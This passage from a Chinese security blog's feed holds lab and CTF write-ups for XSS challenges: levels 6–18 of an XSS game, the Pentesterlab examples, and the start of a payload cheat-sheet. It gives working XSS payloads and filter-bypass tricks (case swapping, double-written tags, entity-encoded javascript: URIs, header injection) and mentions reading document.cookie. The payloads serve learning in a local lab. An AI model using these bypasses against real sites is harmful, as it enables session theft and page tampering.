6</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"&lt;scr_ipt&gt;alert(8)&lt;/script&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同上一题一样的源代码，那么我们试试上一题的payload，发现href被过滤</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">""</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">hr_ef</span>=<span class="string">javascript:alert(9)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //"&gt;</span><br></pre></td></tr></table></figure><p>那么首先尝试大小写绕过，发现成功，点击xss弹窗，payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt; &lt;a Href=javascript:alert(10)&gt;xss&lt;/a&gt; //</span></span><br></pre></td></tr></table></figure><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="- Level 7"></a>- Level 7</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"&lt;&gt;alert(11)&lt;/&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现script只有直接被删去了，其他的没有变化，那么可以尝试双写绕过，构造payload如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt; <span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(12)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span> //</span><br></pre></td></tr></table></figure><p>成功弹窗</p><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="- Level 8"></a>- Level 8</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(13)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">BR</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;scr_ipt&gt;alert(13)&lt;/scr_ipt&gt;"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现它把我们输入的内容加到了href标签里面，而且对 &lt;&gt; 和script进行了过滤，那么我们首先直接尝试<code>&quot;javascript:alert(1)&quot;</code>+大小写绕过，构造如下payload进行尝试</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JavaScriPt:alert(1)</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascr_ipt:alert(14)"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现不行，然后仔细看第一次尝试的结果，发现它先将我们的 &lt;&gt; 实体化了，但是在href标签里面变回来了，说明它可能会对html实体化编码进行解析，那么我们可以尝试把 <code>&quot;javascript:alert(1)&quot;</code> 先实体化再输进去，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><p>然后点击友情链接，成功弹窗</p><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="- Level 9"></a>- Level 9</h2><p>本题在上一题的基础上加了一个合法性验证，及网址必须有http://，那我们在上一题的基础上后面加上http://即可。也可以使用制表符（tab %09）来绕过script过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br><span class="line">javasc%09riPt:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="- Level 10"></a>- Level 10</h2><p>查看源代码，发现了隐藏的form</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_link"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_history"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_sort"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后测试有没有注入点，发现 t_sort 可以注入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.183.133/xss/level10.php?keyword=well%20done!&amp;t_link=test&amp;t_history=test&amp;t_sort=text</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_sort"</span>  <span class="attr">value</span>=<span class="string">"text"</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么在这里进行注入弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.183.133&#x2F;xss&#x2F;level10.php?keyword&#x3D;well%20done!&amp;t_link&#x3D;test&amp;t_history&#x3D;test&amp;t_sort&#x3D;&quot; type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><h2 id="Level-11"><a href="#Level-11" class="headerlink" title="- Level 11"></a>- Level 11</h2><p>查看网页源码，发现多了新东西</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_link"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_history"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_sort"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_ref"</span>  <span class="attr">value</span>=<span class="string">"http://192.168.183.133/xss/level10.php?keyword=well%20done!&amp;t_link=test&amp;t_history=test&amp;t_sort=%22%20type=%22text%22%20onclick=%22alert(1)"</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>t_ref</code>的值是上一关的网址，因为这个页面是从上个页面的通关提示跳转过来的。用burp抓包，发现<code>t_ref</code>的值是referer的值，那我们就直接修改referer的值为<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code>，成功。</p><h2 id="Level-12"><a href="#Level-12" class="headerlink" title="- Level 12"></a>- Level 12</h2><p>查看网页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_link"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_history"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_sort"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_ua"</span>  <span class="attr">value</span>=<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现<code>t_ref</code>变成了<code>t_ua</code>，值也变成了user-agent的值，那和上题方法一样，用burp抓包，修改user-agent的值就可以了。</p><h2 id="Level-13"><a href="#Level-13" class="headerlink" title="- Level 13"></a>- Level 13</h2><p>这一关和上一关差不多，只不过<code>t_ua</code>变成了<code>t_cook</code>怀疑是cookie的值，抓包一看，就是cookie里面的值，那和上一题一样，修改cookie的值就可以了</p><h2 id="Level-14"><a href="#Level-14" class="headerlink" title="- Level 14"></a>- Level 14</h2><p><span class="exturl" data-url="aHR0cDovL2V4b2Z2b2V3ZXIub3JnLw==" title="http://exofvoewer.org/">http://exofvoewer.org<i class="fa fa-external-link"></i></span>登不上，放弃了，可以直接看<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTIwNj9hY2NvdW50dHJhY2VpZD03NGFiNDA0ZC0yYTAxLTRhMWMtOGI4Ny0zNmFkMzY3ZGJlMTEjdG9jLTEy" title="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12">先知上的wp<i class="fa fa-external-link"></i></span>了解exif xss</p><h2 id="Level-15"><a href="#Level-15" class="headerlink" title="- Level 15"></a>- Level 15</h2><p>这题有angular js，然后ng-include相当于php的include函数，然后src参数被转义了，最终我们<br>可以include leve1然后再用script标签传xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.183.133&#x2F;xss&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure><p>测试时可能因为浏览器自动更改页面内容，避免xss，所以如果没成功，换浏览器试试。</p><h2 id="Level-16"><a href="#Level-16" class="headerlink" title="- Level 16"></a>- Level 16</h2><p>本题过滤了script和空格，不能用script标签，我们使用img标签，空格不能用，可以使用换行符<code>\n</code>（%0A）代替</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.183.133&#x2F;xss&#x2F;level16.php?keyword&#x3D;%3Cimg%0asrc&#x3D;1%0aonerror&#x3D;%27alert(16)%27%3E</span><br></pre></td></tr></table></figure><h2 id="Level-17"><a href="#Level-17" class="headerlink" title="- Level 17"></a>- Level 17</h2><p>加载flash后，发现图片那个是一个embed标签，而且标签的变量值可以通过url输入改变，那么尝试直接插入事件，插入onmousemove事件，然后移动鼠标，即可弹窗。</p><h2 id="Level-18"><a href="#Level-18" class="headerlink" title="- Level 18"></a>- Level 18</h2><p>同上题一样。</p><p>剩下的两题是flash xss 需要对flash进行反编译理解源码才能明白如何注入，所以目前先这样吧</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> xss挑战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pentestlab_xss练习</title>
      <link href="/2020/03/08/pentestlab-xss%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/03/08/pentestlab-xss%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>pentestlab靶场的xss练习模块的write up</p><a id="more"></a><h1 id="Pentestlab-XSS练习"><a href="#Pentestlab-XSS练习" class="headerlink" title="- Pentestlab_XSS练习"></a>- Pentestlab_XSS练习</h1><h2 id="sample-1"><a href="#sample-1" class="headerlink" title="- sample 1"></a>- sample 1</h2><p>第一题是反射型XSS，题目的URL如下，没有任何过滤，所以直接将name的值换成XSS语句即可弹窗</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.183.130/xss/example1.php?name=hacker</span><br><span class="line">name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>"</span><br></pre></td></tr></table></figure><h2 id="sample-2"><a href="#sample-2" class="headerlink" title="- sample 2"></a>- sample 2</h2><p>先进行基本测试， 输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现 script 被过滤，而且是直接删除，所以进行大小写绕过尝试，成功弹窗。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sample-3"><a href="#sample-3" class="headerlink" title="- sample 3"></a>- sample 3</h2><p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现和上一题一样过滤了script标签，查看网页源代码，发现只过滤了前面的script标签，后面的正常，所以只是script标签不能用，没有进行script字符串过滤。那么尝试其他标签，构造下面的payload，然后点击XSS，成功弹窗</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">http://192.168.183.130/xss/example3.php?name=<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sample-4"><a href="#sample-4" class="headerlink" title="- sample 4"></a>- sample 4</h2><p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现输出error，因为看不到输入的值，所以只能测试到底怎么过滤的，经过测试，可能是检测到script字符串就输出error，那么尝试其他不要script字符串的标签，发现input标签可用，那么构造payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">'alert(1)'</span> <span class="attr">type</span>=<span class="string">'text'</span>&gt;</span></span><br><span class="line">http://192.168.183.130/xss/example4.php?name=<span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">'alert(1)'</span> <span class="attr">type</span>=<span class="string">'text'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击输入框，成功弹窗</p><h2 id="sample-5"><a href="#sample-5" class="headerlink" title="- sample 5"></a>- sample 5</h2><p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现输出error，测试到底怎么过滤的，发现是过滤alert字符串，但是&lt;&gt;、script、’ ‘都不处理，所以我们只需要考虑怎么绕过alert或者替换掉alert就行，构造下面的payload（两种都可以弹窗）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">self[<span class="string">'al'</span>%<span class="number">2</span>B<span class="string">'ert'</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// %2B是+的url编码，它过滤了+</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//prompt()也是一个弹窗函数</span><br></pre></td></tr></table></figure><h2 id="sample-6"><a href="#sample-6" class="headerlink" title="- sample 6"></a>- sample 6</h2><p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现输出只有”;，查看源代码，发现把我们的输入传给一个参数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">var $a= "<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>";</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现它只是传了一个值，没有进行任何的过滤，那么我们只要逃逸” “就可以了，构造payload，成功弹窗</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">" <span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="number">1</span>) <span class="comment">//</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// 首先用"闭合前面的赋值语句，然后闭合前面的script标签，后面的注释注释掉原句的";然后利用原句的script闭合标签闭合</span></span></span><br></pre></td></tr></table></figure><h2 id="sample-7"><a href="#sample-7" class="headerlink" title="- sample 7"></a>- sample 7</h2><p>本题在上一题的基础上，加了对&lt;&gt;的实体化编码，但是原语句本身就在script标签里面，我们只需要逃逸出赋值语句就行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> $a= <span class="string">''</span>,&amp;lt;alert&amp;gt;(<span class="number">1</span>) <span class="comment">//';</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上一题的payload写的复杂了一点，下面的payload就可以直接逃逸出赋值语句</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">';<span class="tag">&lt;<span class="name">alert</span>&gt;</span>(1) //</span><br><span class="line">// '; 闭合前面的赋值语句，后面的注释符注释原句的';</span><br></pre></td></tr></table></figure><h2 id="sample-8"><a href="#sample-8" class="headerlink" title="- sample 8"></a>- sample 8</h2><p>本题有了输入框，输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>进行测试，发现它原样输出了，查看源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELLO <span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/xss/example8.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">  Your name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>发现对&lt;&gt;进行了实体化编码，尝试绕过没有成功，看到有input标签，想尝试onclick()，但是发现 “ 也被实体化了，尝试绕过无果，只能继续想别的思路。再看源码，发现新的突破点</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/xss/example8.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现action的值是URL，于是尝试从URL入手，首先在URL后面添加/，然后查看源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/xss/example8.php/"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">  Your name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>果然action的值跟着变化了，那么尝试构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;form</span><br><span class="line">&#x2F;&#x2F; &quot;&gt;闭合前面的form标签，后面的&lt;form闭合后面的原form标签，这里不能直接使用注释符，不然会无法正常执行原网页代码</span><br></pre></td></tr></table></figure><p>成功弹窗</p><h2 id="sample-9"><a href="#sample-9" class="headerlink" title="- sample 9"></a>- sample 9</h2><p>这题发现URL里面没有传参，查看源码也没有发现那里有hacker字符串，然后发现有一个不一样的地方</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(location.hash.substring(<span class="number">1</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析这句语句，document.write()是把括号里面的内容输出到页面，location.hash属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分），substring是截取字符串的函数，后面一般两个参数start和end，截取范围为[start, end)。所以这题我们只需要对URL进行构造即可弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.183.130&#x2F;xss&#x2F;example9.php#&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>使用IE浏览器可以成功弹窗，其他浏览器会对URL进行编码转换。</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> pentestlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss常见手法</title>
      <link href="/2020/03/08/xss%E5%B8%B8%E8%A7%81%E6%89%8B%E6%B3%95/"/>
      <url>/2020/03/08/xss%E5%B8%B8%E8%A7%81%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>一些常见的xss弹窗的手段，做下笔记。</p><a id="more"></a><h1 id="XSS-常用手法"><a href="#XSS-常用手法" class="headerlink" title="- XSS 常用手法"></a>- XSS 常用手法</h1><h2 id="利用基本的script标签来弹窗"><a href="#利用基本的script标签来弹窗" class="headerlink" title="- 利用基本的script标签来弹窗"></a>- 利用基本的script标签来弹窗</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>script 标签用于定义客户端脚本，比如 JavaScript。</p><h2 id="利用iframe标签的的src属性来弹窗"><a href="#利用iframe标签的的src属性来弹窗" class="headerlink" title="- 利用iframe标签的的src属性来弹窗"></a>- 利用iframe标签的的src属性来弹窗</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">xss</span>')&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。</p><h2 id="利用标签的href属性来弹窗"><a href="#利用标签的href属性来弹窗" class="headerlink" title="- 利用标签的href属性来弹窗"></a>- 利用标签的href属性来弹窗</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>'<span class="attr">xss</span>')&gt;</span>ggtest<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里就是超链接到了:<code>javascript:alert(&#39;xss&#39;)</code><br>       效果和浏览器直接打开这个地址:<code>javascript:alert(&#39;xss&#39;)</code>是一样的。<br>       这里还可以使用：<code>javascript:alert(document.cookie)</code> 来弹出当前会话的cookie</p><h2 id="利用标签弹窗"><a href="#利用标签弹窗" class="headerlink" title="- 利用标签弹窗"></a>- 利用标签弹窗</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure><p>这里的src后面是填写的是图片的地址，为了测试简便这个地址里面我们一般随便填写,比如这里我们填写的就是 <code>1</code>，因为<code>1</code>不是一个正确的值，所以 触发了后面的 <code>onerror</code>事件（遇到错误就触发）<br>       当然如果在src里面填写一个正常的URL的话，就不会弹窗的了，因为onerror的触发条件是得报错。<br>       当<code>src</code>后面的值是正确的时候呢，这个还可以用 <code>oneclick</code>事件来触发弹窗，这里不论src后面的值是否正确，只要鼠标点击，就会触发弹窗事件。</p><h2 id="常见的事件"><a href="#常见的事件" class="headerlink" title="- 常见的事件"></a>- 常见的事件</h2><h3 id="windows-事件"><a href="#windows-事件" class="headerlink" title="- windows 事件"></a>- windows 事件</h3><table><thead><tr><th align="center">事件</th><th align="left">作用</th></tr></thead><tbody><tr><td align="center">onerror</td><td align="left">在错误发生时运行的脚本</td></tr><tr><td align="center">onload</td><td align="left">页面结束加载之后触发</td></tr></tbody></table><h3 id="Keyboard-事件"><a href="#Keyboard-事件" class="headerlink" title="- Keyboard 事件"></a>- Keyboard 事件</h3><table><thead><tr><th align="center">事件</th><th align="left">作用</th></tr></thead><tbody><tr><td align="center">onkeydown</td><td align="left">在用户按下按键时触发</td></tr><tr><td align="center">onkeypress</td><td align="left">在用户敲击按钮时触发</td></tr><tr><td align="center">onkeyup</td><td align="left">当用户释放按键时触发</td></tr></tbody></table><h3 id="鼠标（Mouse）事件"><a href="#鼠标（Mouse）事件" class="headerlink" title="- 鼠标（Mouse）事件"></a>- 鼠标（Mouse）事件</h3><table><thead><tr><th align="center">事件</th><th 